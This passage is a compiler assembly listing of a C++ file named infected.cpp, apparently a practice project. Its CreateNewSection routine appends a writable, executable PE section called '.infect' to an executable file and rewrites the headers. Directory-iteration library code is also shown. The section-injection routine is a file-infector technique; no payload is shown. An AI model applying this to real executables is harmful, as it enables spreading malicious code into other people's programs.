  000bc	6b d1 28	 imul	 edx, ecx, 40
  000bf	03 55 ec	 add	 edx, DWORD PTR _pSectionHeader$[ebp]
  000c2	52		 push	 edx
  000c3	e8 00 00 00 00	 call	 _memset
  000c8	83 c4 0c	 add	 esp, 12			; 0000000cH

; 38   :     CopyMemory(&pSectionHeader[sectionCount].Name, ".infect", 8);

  000cb	6a 08		 push	 8
  000cd	68 00 00 00 00	 push	 OFFSET $SG147751
  000d2	0f b7 45 f0	 movzx	 eax, WORD PTR _sectionCount$[ebp]
  000d6	6b c8 28	 imul	 ecx, eax, 40
  000d9	03 4d ec	 add	 ecx, DWORD PTR _pSectionHeader$[ebp]
  000dc	51		 push	 ecx
  000dd	e8 00 00 00 00	 call	 _memcpy
  000e2	83 c4 0c	 add	 esp, 12			; 0000000cH

; 39   :     // Using 8 bytes for section name,cause it is the maximum allowed section name size
; 40   : 
; 41   :     // Insert all the required information about our new PE section
; 42   :     pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);

  000e5	6a 00		 push	 0
  000e7	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  000ea	8b 02		 mov	 eax, DWORD PTR [edx]
  000ec	8b 48 38	 mov	 ecx, DWORD PTR [eax+56]
  000ef	51		 push	 ecx
  000f0	8b 55 1c	 mov	 edx, DWORD PTR _sizeOfSection$[ebp]
  000f3	52		 push	 edx
  000f4	e8 00 00 00 00	 call	 ?align@@YAKKKK@Z	; align
  000f9	83 c4 0c	 add	 esp, 12			; 0000000cH
  000fc	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  00100	6b d1 28	 imul	 edx, ecx, 40
  00103	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  00106	89 44 11 08	 mov	 DWORD PTR [ecx+edx+8], eax

; 43   :     pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);

  0010a	0f b7 55 f0	 movzx	 edx, WORD PTR _sectionCount$[ebp]
  0010e	83 ea 01	 sub	 edx, 1
  00111	6b c2 28	 imul	 eax, edx, 40
  00114	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  00117	8b 54 01 0c	 mov	 edx, DWORD PTR [ecx+eax+12]
  0011b	52		 push	 edx
  0011c	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  0011f	8b 08		 mov	 ecx, DWORD PTR [eax]
  00121	8b 51 38	 mov	 edx, DWORD PTR [ecx+56]
  00124	52		 push	 edx
  00125	0f b7 45 f0	 movzx	 eax, WORD PTR _sectionCount$[ebp]
  00129	83 e8 01	 sub	 eax, 1
  0012c	6b c8 28	 imul	 ecx, eax, 40
  0012f	8b 55 ec	 mov	 edx, DWORD PTR _pSectionHeader$[ebp]
  00132	8b 44 0a 08	 mov	 eax, DWORD PTR [edx+ecx+8]
  00136	50		 push	 eax
  00137	e8 00 00 00 00	 call	 ?align@@YAKKKK@Z	; align
  0013c	83 c4 0c	 add	 esp, 12			; 0000000cH
  0013f	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  00143	6b d1 28	 imul	 edx, ecx, 40
  00146	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  00149	89 44 11 0c	 mov	 DWORD PTR [ecx+edx+12], eax

; 44   :     pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);

  0014d	6a 00		 push	 0
  0014f	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00152	8b 02		 mov	 eax, DWORD PTR [edx]
  00154	8b 48 3c	 mov	 ecx, DWORD PTR [eax+60]
  00157	51		 push	 ecx
  00158	8b 55 1c	 mov	 edx, DWORD PTR _sizeOfSection$[ebp]
  0015b	52		 push	 edx
  0015c	e8 00 00 00 00	 call	 ?align@@YAKKKK@Z	; align
  00161	83 c4 0c	 add	 esp, 12			; 0000000cH
  00164	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  00168	6b d1 28	 imul	 edx, ecx, 40
  0016b	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  0016e	89 44 11 10	 mov	 DWORD PTR [ecx+edx+16], eax

; 45   :     pSectionHeader[sectionCount].PointerToRawData = align(pSectionHeader[sectionCount - 1].SizeOfRawData, pNtHeader->OptionalHeader.FileAlignment, pSectionHeader[sectionCount - 1].PointerToRawData);

  00172	0f b7 55 f0	 movzx	 edx, WORD PTR _sectionCount$[ebp]
  00176	83 ea 01	 sub	 edx, 1
  00179	6b c2 28	 imul	 eax, edx, 40
  0017c	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  0017f	8b 54 01 14	 mov	 edx, DWORD PTR [ecx+eax+20]
  00183	52		 push	 edx
  00184	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00187	8b 08		 mov	 ecx, DWORD PTR [eax]
  00189	8b 51 3c	 mov	 edx, DWORD PTR [ecx+60]
  0018c	52		 push	 edx
  0018d	0f b7 45 f0	 movzx	 eax, WORD PTR _sectionCount$[ebp]
  00191	83 e8 01	 sub	 eax, 1
  00194	6b c8 28	 imul	 ecx, eax, 40
  00197	8b 55 ec	 mov	 edx, DWORD PTR _pSectionHeader$[ebp]
  0019a	8b 44 0a 10	 mov	 eax, DWORD PTR [edx+ecx+16]
  0019e	50		 push	 eax
  0019f	e8 00 00 00 00	 call	 ?align@@YAKKKK@Z	; align
  001a4	83 c4 0c	 add	 esp, 12			; 0000000cH
  001a7	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  001ab	6b d1 28	 imul	 edx, ecx, 40
  001ae	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  001b1	89 44 11 14	 mov	 DWORD PTR [ecx+edx+20], eax

; 46   :     pSectionHeader[sectionCount].Characteristics = 0xE00000E0;

  001b5	0f b7 55 f0	 movzx	 edx, WORD PTR _sectionCount$[ebp]
  001b9	6b c2 28	 imul	 eax, edx, 40
  001bc	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  001bf	c7 44 01 24 e0
	00 00 e0	 mov	 DWORD PTR [ecx+eax+36], -536870688 ; e00000e0H

; 47   : 
; 48   :     /*
; 49   :     0xE00000E0 = IMAGE_SCN_MEM_WRITE |
; 50   :                 IMAGE_SCN_CNT_CODE  |
; 51   :                 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
; 52   :                 IMAGE_SCN_MEM_EXECUTE |
; 53   :                 IMAGE_SCN_CNT_INITIALIZED_DATA |
; 54   :                 IMAGE_SCN_MEM_READ
; 55   :     */
; 56   : 
; 57   :     SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);

  001c7	6a 00		 push	 0
  001c9	6a 00		 push	 0
  001cb	0f b7 55 f0	 movzx	 edx, WORD PTR _sectionCount$[ebp]
  001cf	6b c2 28	 imul	 eax, edx, 40
  001d2	0f b7 4d f0	 movzx	 ecx, WORD PTR _sectionCount$[ebp]
  001d6	6b d1 28	 imul	 edx, ecx, 40
  001d9	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  001dc	8b 44 01 14	 mov	 eax, DWORD PTR [ecx+eax+20]
  001e0	8b 4d ec	 mov	 ecx, DWORD PTR _pSectionHeader$[ebp]
  001e3	03 44 11 10	 add	 eax, DWORD PTR [ecx+edx+16]
  001e7	50		 push	 eax
  001e8	8b 55 08	 mov	 edx, DWORD PTR _hFile$[ebp]
  001eb	8b 02		 mov	 eax, DWORD PTR [edx]
  001ed	50		 push	 eax
  001ee	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 58   :     // End the file right here,on the last section + it's own size
; 59   :     SetEndOfFile(hFile);

  001f4	8b 4d 08	 mov	 ecx, DWORD PTR _hFile$[ebp]
  001f7	8b 11		 mov	 edx, DWORD PTR [ecx]
  001f9	52		 push	 edx
  001fa	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetEndOfFile@4

; 60   :     // Change the size of the image,to correspond to modifications
; 61   :     // Adding a new section,the image size is bigger
; 62   :     pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;

  00200	0f b7 45 f0	 movzx	 eax, WORD PTR _sectionCount$[ebp]
  00204	6b c8 28	 imul	 ecx, eax, 40
  00207	0f b7 55 f0	 movzx	 edx, WORD PTR _sectionCount$[ebp]
  0020b	6b c2 28	 imul	 eax, edx, 40
  0020e	8b 55 ec	 mov	 edx, DWORD PTR _pSectionHeader$[ebp]
  00211	8b 4c 0a 0c	 mov	 ecx, DWORD PTR [edx+ecx+12]
  00215	8b 55 ec	 mov	 edx, DWORD PTR _pSectionHeader$[ebp]
  00218	03 4c 02 08	 add	 ecx, DWORD PTR [edx+eax+8]
  0021c	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  0021f	8b 10		 mov	 edx, DWORD PTR [eax]
  00221	89 4a 50	 mov	 DWORD PTR [edx+80], ecx

; 63   :     // After adding a new section, change the number of section
; 64   :     pNtHeader->FileHeader.NumberOfSections += 1;

  00224	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00227	8b 08		 mov	 ecx, DWORD PTR [eax]
  00229	0f b7 51 06	 movzx	 edx, WORD PTR [ecx+6]
  0022d	83 c2 01	 add	 edx, 1
  00230	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00233	8b 08		 mov	 ecx, DWORD PTR [eax]
  00235	66 89 51 06	 mov	 WORD PTR [ecx+6], dx

; 65   :     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

  00239	6a 00		 push	 0
  0023b	6a 00		 push	 0
  0023d	6a 00		 push	 0
  0023f	8b 55 08	 mov	 edx, DWORD PTR _hFile$[ebp]
  00242	8b 02		 mov	 eax, DWORD PTR [edx]
  00244	50		 push	 eax
  00245	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 66   :     // Adding all the modifications to the file
; 67   :     WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);

  0024b	6a 00		 push	 0
  0024d	8b 4d 18	 mov	 ecx, DWORD PTR _bytesWritten$[ebp]
  00250	51		 push	 ecx
  00251	8b 55 14	 mov	 edx, DWORD PTR _fileSize$[ebp]
  00254	8b 02		 mov	 eax, DWORD PTR [edx]
  00256	50		 push	 eax
  00257	8b 4d 10	 mov	 ecx, DWORD PTR _pByte$[ebp]
  0025a	51		 push	 ecx
  0025b	8b 55 08	 mov	 edx, DWORD PTR _hFile$[ebp]
  0025e	8b 02		 mov	 eax, DWORD PTR [edx]
  00260	50		 push	 eax
  00261	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 68   :     return true;

  00267	b0 01		 mov	 al, 1
$LN1@CreateNewS:

; 69   : }

  00269	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0026c	33 cd		 xor	 ecx, ebp
  0026e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00273	8b e5		 mov	 esp, ebp
  00275	5d		 pop	 ebp
  00276	c3		 ret	 0
?CreateNewSection@@YA_NAAPAXAAPAU_IMAGE_NT_HEADERS@@PAEAAK3K@Z ENDP ; CreateNewSection
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
_size$ = 8						; size = 4
_align$ = 12						; size = 4
_address$ = 16						; size = 4
?align@@YAKKKK@Z PROC					; align

; 15   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 16   :     if (!(size % align))

  00003	8b 45 08	 mov	 eax, DWORD PTR _size$[ebp]
  00006	33 d2		 xor	 edx, edx
  00008	f7 75 0c	 div	 DWORD PTR _align$[ebp]
  0000b	85 d2		 test	 edx, edx
  0000d	75 08		 jne	 SHORT $LN2@align

; 17   :         return address + size;

  0000f	8b 45 10	 mov	 eax, DWORD PTR _address$[ebp]
  00012	03 45 08	 add	 eax, DWORD PTR _size$[ebp]
  00015	eb 12		 jmp	 SHORT $LN1@align
$LN2@align:

; 18   :     return address + (size / align + 1) * align;

  00017	8b 45 08	 mov	 eax, DWORD PTR _size$[ebp]
  0001a	33 d2		 xor	 edx, edx
  0001c	f7 75 0c	 div	 DWORD PTR _align$[ebp]
  0001f	83 c0 01	 add	 eax, 1
  00022	0f af 45 0c	 imul	 eax, DWORD PTR _align$[ebp]
  00026	03 45 10	 add	 eax, DWORD PTR _address$[ebp]
$LN1@align:

; 19   : }

  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
?align@@YAKKKK@Z ENDP					; align
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAU_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAU_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z PROC ; std::move<std::filesystem::_Dir_enum_impl::_Creator &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAU_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ENDP ; std::move<std::filesystem::_Dir_enum_impl::_Creator &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?end@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
___formal$ = 12						; size = 8
?end@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z PROC ; std::filesystem::end, COMDAT

; 2723 :     _EXPORT_STD _NODISCARD inline directory_iterator end(directory_iterator) noexcept {

  0000a	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00010	e8 00 00 00 00	 call	 ??0directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::directory_iterator
  00015	8d 4d 0c	 lea	 ecx, DWORD PTR ___formal$[ebp]
  00018	e8 00 00 00 00	 call	 ??1directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::~directory_iterator
  0001d	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 2725 :     }

  00020	5d		 pop	 ebp
  00021	c3		 ret	 0
?end@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ENDP ; std::filesystem::end
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?begin@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Iter$ = 12						; size = 8
?begin@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z PROC ; std::filesystem::begin, COMDAT

; 2719 :     _EXPORT_STD _NODISCARD inline directory_iterator begin(directory_iterator _Iter) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2720 :         return _Iter;

  00003	8d 45 0c	 lea	 eax, DWORD PTR __Iter$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0directory_iterator@filesystem@std@@QAE@$$QAV012@@Z ; std::filesystem::directory_iterator::directory_iterator
  0000f	8d 4d 0c	 lea	 ecx, DWORD PTR __Iter$[ebp]
  00012	e8 00 00 00 00	 call	 ??1directory_iterator@filesystem@std@@QAE@XZ ; std::filesystem::directory_iterator::~directory_iterator
  00017	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 2721 :     }

  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
?begin@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ENDP ; std::filesystem::begin
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$?9U_Dir_enum_impl@filesystem@std@@U012@@std@@YA_NABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@0@Z
_TEXT	SEGMENT
tv77 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$?9U_Dir_enum_impl@filesystem@std@@U012@@std@@YA_NABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@0@Z PROC ; std::operator!=<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl>, COMDAT

; 1853 : _NODISCARD bool operator!=(const shared_ptr<_Ty1>& _Left, const shared_ptr<_Ty2>& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	56		 push	 esi

; 1854 :     return _Left.get() != _Right.get();

  00005	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  00008	e8 00 00 00 00	 call	 ?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get
  0000d	8b f0		 mov	 esi, eax
  0000f	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	e8 00 00 00 00	 call	 ?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get
  00017	3b f0		 cmp	 esi, eax
  00019	74 09		 je	 SHORT $LN3@operator
  0001b	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv77[ebp], 1
  00022	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00024	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv77[ebp], 0
$LN4@operator:
  0002b	0f b6 45 fc	 movzx	 eax, BYTE PTR tv77[ebp]

; 1855 : }

  0002f	5e		 pop	 esi
  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c3		 ret	 0
??$?9U_Dir_enum_impl@filesystem@std@@U012@@std@@YA_NABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@0@Z ENDP ; std::operator!=<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$?CU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEPAU_Dir_enum_impl@filesystem@1@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??$?CU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEPAU_Dir_enum_impl@filesystem@1@XZ PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator-><std::filesystem::_Dir_enum_impl,0>, COMDAT
; _this$ = ecx

; 1732 :     _NODISCARD _Ty2* operator->() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1733 :         return get();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get

; 1734 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$?CU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEPAU_Dir_enum_impl@filesystem@1@XZ ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator-><std::filesystem::_Dir_enum_impl,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Initialize_dir_enum@U_Dir_enum_impl@filesystem@std@@@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@2@ABVpath@12@W4directory_options@12@@Z
_TEXT	SEGMENT
$T1 = -644						; size = 8
$T2 = -636						; size = 4
__Create_data$ = -632					; size = 628
__$ArrayPad$ = -4					; size = 4
__Impl$ = 8						; size = 4
__Path$ = 12						; size = 4
__Options$ = 16						; size = 4
??$_Initialize_dir_enum@U_Dir_enum_impl@filesystem@std@@@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@2@ABVpath@12@W4directory_options@12@@Z PROC ; std::filesystem::_Dir_enum_impl::_Initialize_dir_enum<std::filesystem::_Dir_enum_impl>, COMDAT

; 2598 :             shared_ptr<_Dir_enum_kind>& _Impl, const path& _Path, const directory_options _Options = {}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 84 02 00
	00		 sub	 esp, 644		; 00000284H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 2599 :             _Creator _Create_data(_Path, _Options);

  00013	8b 45 10	 mov	 eax, DWORD PTR __Options$[ebp]
  00016	50		 push	 eax
  00017	8b 4d 0c	 mov	 ecx, DWORD PTR __Path$[ebp]
  0001a	51		 push	 ecx
  0001b	8d 8d 88 fd ff
	ff		 lea	 ecx, DWORD PTR __Create_data$[ebp]
  00021	e8 00 00 00 00	 call	 ??0_Creator@_Dir_enum_impl@filesystem@std@@QAE@ABVpath@23@W4directory_options@23@@Z ; std::filesystem::_Dir_enum_impl::_Creator::_Creator

; 2600 :             if (_Create_data._Status._Should_create_impl) {

  00026	0f b6 55 f4	 movzx	 edx, BYTE PTR __Create_data$[ebp+620]
  0002a	85 d2		 test	 edx, edx
  0002c	74 37		 je	 SHORT $LN2@Initialize

; 2601 :                 _Impl = _STD make_shared<_Dir_enum_kind>(_STD move(_Create_data), _Options);

  0002e	8d 45 10	 lea	 eax, DWORD PTR __Options$[ebp]
  00031	50		 push	 eax
  00032	8d 8d 88 fd ff
	ff		 lea	 ecx, DWORD PTR __Create_data$[ebp]
  00038	51		 push	 ecx
  00039	e8 00 00 00 00	 call	 ??$move@AAU_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::move<std::filesystem::_Dir_enum_impl::_Creator &>
  0003e	83 c4 04	 add	 esp, 4
  00041	50		 push	 eax
  00042	8d 95 7c fd ff
	ff		 lea	 edx, DWORD PTR $T1[ebp]
  00048	52		 push	 edx
  00049	e8 00 00 00 00	 call	 ??$make_shared@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YA?AV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@$$QAU_Creator@_Dir_enum_impl@filesystem@0@ABW4directory_options@40@@Z ; std::make_shared<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
  0004e	83 c4 0c	 add	 esp, 12			; 0000000cH
  00051	50		 push	 eax
  00052	8b 4d 08	 mov	 ecx, DWORD PTR __Impl$[ebp]
  00055	e8 00 00 00 00	 call	 ??4?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEAAV01@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator=
  0005a	8d 8d 7c fd ff
	ff		 lea	 ecx, DWORD PTR $T1[ebp]
  00060	e8 00 00 00 00	 call	 ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>
$LN2@Initialize:

; 2602 :             }
; 2603 :             return _Create_data._Status._Error;

  00065	8b 45 f8	 mov	 eax, DWORD PTR __Create_data$[ebp+624]
  00068	89 85 84 fd ff
	ff		 mov	 DWORD PTR $T2[ebp], eax
  0006e	8d 8d 88 fd ff
	ff		 lea	 ecx, DWORD PTR __Create_data$[ebp]
  00074	e8 00 00 00 00	 call	 ??1_Creator@_Dir_enum_impl@filesystem@std@@QAE@XZ
  00079	8b 85 84 fd ff
	ff		 mov	 eax, DWORD PTR $T2[ebp]

; 2604 :         }

  0007f	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00082	33 cd		 xor	 ecx, ebp
  00084	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00089	8b e5		 mov	 esp, ebp
  0008b	5d		 pop	 ebp
  0008c	c3		 ret	 0
??$_Initialize_dir_enum@U_Dir_enum_impl@filesystem@std@@@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@2@ABVpath@12@W4directory_options@12@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Initialize_dir_enum<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??9directory_iterator@filesystem@std@@QBE_NABV012@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Rhs$ = 8						; size = 4
??9directory_iterator@filesystem@std@@QBE_NABV012@@Z PROC ; std::filesystem::directory_iterator::operator!=, COMDAT
; _this$ = ecx

; 2694 :         _NODISCARD bool operator!=(const directory_iterator& _Rhs) const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2695 :             return _Impl != _Rhs._Impl;

  00007	8b 45 08	 mov	 eax, DWORD PTR __Rhs$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$?9U_Dir_enum_impl@filesystem@std@@U012@@std@@YA_NABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@0@Z ; std::operator!=<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl>
  00014	83 c4 08	 add	 esp, 8

; 2696 :         }

  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c2 04 00	 ret	 4
??9directory_iterator@filesystem@std@@QBE_NABV012@@Z ENDP ; std::filesystem::directory_iterator::operator!=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??Edirectory_iterator@filesystem@std@@QAEAAV012@XZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
__Error$ = -4						; size = 4
??Edirectory_iterator@filesystem@std@@QAEAAV012@XZ PROC	; std::filesystem::directory_iterator::operator++, COMDAT
; _this$ = ecx

; 2674 :         directory_iterator& operator++() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 2675 :             const auto _Error = _Dir_enum_impl::_Advance_and_reset_if_no_more_files(_Impl);

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ?_Advance_and_reset_if_no_more_files@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@3@@Z ; std::filesystem::_Dir_enum_impl::_Advance_and_reset_if_no_more_files
  00012	83 c4 04	 add	 esp, 4
  00015	89 45 fc	 mov	 DWORD PTR __Error$[ebp], eax

; 2676 :             if (_Error != __std_win_error::_Success) {

  00018	83 7d fc 00	 cmp	 DWORD PTR __Error$[ebp], 0
  0001c	74 0e		 je	 SHORT $LN2@operator

; 2677 :                 _Throw_fs_error("directory_iterator::operator++", _Error);

  0001e	8b 4d fc	 mov	 ecx, DWORD PTR __Error$[ebp]
